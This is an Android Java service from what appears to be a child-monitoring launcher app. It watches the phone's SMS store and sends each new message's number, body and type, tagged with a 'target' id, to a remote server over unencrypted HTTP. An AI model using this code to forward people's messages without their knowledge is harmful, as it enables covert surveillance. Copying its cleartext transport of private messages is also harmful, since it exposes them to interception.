package com.example.marwa.launcher002.services;

import android.Manifest;
import android.app.Service;
import android.app.admin.DevicePolicyManager;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;

import android.provider.Telephony;
import android.support.annotation.Nullable;
import android.support.v4.content.ContextCompat;
import android.util.Log;
import android.widget.Toast;

import com.android.volley.AuthFailureError;
import com.android.volley.Request;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;
import com.example.marwa.launcher002.MainActivity;
import com.example.marwa.launcher002.Singleton.MySingleton;
import com.example.marwa.launcher002.model.SmsData;
import com.example.marwa.launcher002.utils.WSadressIP;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;
import java.util.HashMap;
import java.util.Map;

import static android.content.ContentValues.TAG;

public class SmsHistory extends Service {
    private WifiManager wifiManager;
    private SmsHistory.SMSObserver smsObserver;

    public SmsHistory() {
        smsObserver = new SmsHistory.SMSObserver();
    }
    private static final String URL_sms = "http://"+ WSadressIP.WSIPChoko+"/kidslanch_serv/web/index.php/sms/add";

    @Override
    public void onCreate() {
        super.onCreate();

        getContentResolver().registerContentObserver(Uri.parse("content://sms"), true, smsObserver);
        Log.i("ok", "Sync SMS service is ready");
    }


    @Override
    public void onDestroy() {
        super.onDestroy();

        getContentResolver().unregisterContentObserver(smsObserver);
    }
    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    @Override
    public int onStartCommand(Intent intent, int flag, int startId) {

        return Service.START_NOT_STICKY;
    }


    final class SMSObserver extends ContentObserver {

        long lastTimeofCall = 0L;
        long lastTimeofUpdate = 0L;
        long threshold_time = 10000;
        //////////////////////////////


        SMSObserver() {
            super(new Handler(Looper.getMainLooper()));

        }

        @Override
        public boolean deliverSelfNotifications() {
            return true;
        }

        @Override
        public void onChange(boolean selfChange, Uri uri) {
            super.onChange(selfChange, uri);



            readSMS();
            lastTimeofCall = System.currentTimeMillis();

            if(lastTimeofCall - lastTimeofUpdate > threshold_time){




                lastTimeofUpdate = System.currentTimeMillis();

            }

        }
    }

    public void readSMS(){


        ContentResolver cr = getContentResolver();
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {

            Cursor c = cr.query(Telephony.Sms.CONTENT_URI, null, null, null, null);
            int totalSMS = 0;

           if(c.getCount()>0){
              c.moveToFirst();

                        String smsId =c.getString(c.getColumnIndexOrThrow(Telephony.Sms._ID));
                        String smsDate = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.DATE));
                        String number = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
                        String body = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.BODY));


                  Date cc = Calendar.getInstance().getTime();
                  String date = cc.toString();



                  SimpleDateFormat df = new SimpleDateFormat("dd-MM-yyyy hh:mm");
                  String datee = df.format(cc);


                        String type=null;
                        switch (Integer.parseInt(c.getString(c.getColumnIndexOrThrow(Telephony.Sms.TYPE)))) {
                            case Telephony.Sms.MESSAGE_TYPE_INBOX:
                                type = "inbox";
                                break;
                            case Telephony.Sms.MESSAGE_TYPE_SENT:
                                type = "sent";
                                break;
                            case Telephony.Sms.MESSAGE_TYPE_OUTBOX:
                                type = "outbox";
                                break;
                            default:
                                break;
                        }

                        Log.v("abcdefghijklmnopqrz",number+body+type);
                        //Toast.makeText(this, number+body+type+dateFormat, Toast.LENGTH_SHORT).show();
                   saveSMS(smsId, datee,type,number,body);
                     NotifDB(type , number);
                    }
               // }

                c.close();

           // }
        }
    }

        public void saveSMS( final String smsid, final String sdate, final String stype , final String snumber , final String sbody) {

            try{
                Log.d("onrecieve", "on recieveeeeeeeeee SMS");
               // final String URL = "http://"+ WSadressIP.WSIP+"/launcher/MAddSms.php";
                StringRequest stringRequest = new StringRequest(Request.Method.POST, URL_sms, new Response.Listener<String>() {
                    @Override
                    public void onResponse(String response) {
                        if(response.contains("success")) {

                        }
                    }
                }, new Response.ErrorListener() {
                    @Override
                    public void onErrorResponse(VolleyError error) {
                        Toast.makeText(getApplicationContext(),"failed to login",Toast.LENGTH_SHORT).show();
                    }
                }){
                    @Override
                    protected Map<String, String> getParams() throws AuthFailureError {
                        Map<String, String> params = new HashMap<>();
                        params.put("Content-Type","application/x-www-form-urlencoded");
                            params.put("id_target", MainActivity.id_target);
                         //   params.put("smsid",smsid);
                            params.put("date",sdate);
                            params.put("type",stype);
                            params.put("number",snumber);
                            params.put("body",sbody);
                            return params;
                        }
                    };
                Log.d("mytag", "OK IM HERE EVERYONE SMS"); // THIS WORKS
                    //adding our stringrequest to queue
                MySingleton.getInstance(getApplicationContext()).addToRequestQueue(stringRequest);
            } catch (Exception e){
                e.printStackTrace();
            }
        }








    final String   URL_Notif =  "http://"+ WSadressIP.WSIPChoko+"/kidslanch_serv/web/index.php/notifs/add";

    public void NotifDB(final String typedOfSMS , final String number) {



        StringRequest stringRequest = new StringRequest(Request.Method.POST, URL_Notif,
                new Response.Listener<String>() {
                    @Override
                    public void onResponse(String response) {

                    }
                },
                new Response.ErrorListener() {
                    @Override
                    public void onErrorResponse(VolleyError error) {

                    }
                }){
            @Override
            protected Map<String, String> getParams() throws AuthFailureError {
                Map<String, String> params = new HashMap<>();
                params.put("Content-Type","application/x-www-form-urlencoded");
                Date c = Calendar.getInstance().getTime();
                SimpleDateFormat df = new SimpleDateFormat("dd-MM-yyyy hh:mm:ss");
                String formattedDate = df.format(c);
                params.put("date", formattedDate);
                params.put("content", "SMS: "+typedOfSMS+" number: "+number);
                params.put("id_target", MainActivity.id_target);
                return params;
            }
        };

        //adding our stringrequest to queue
        Volley.newRequestQueue(SmsHistory.this).add(stringRequest);

    }

}
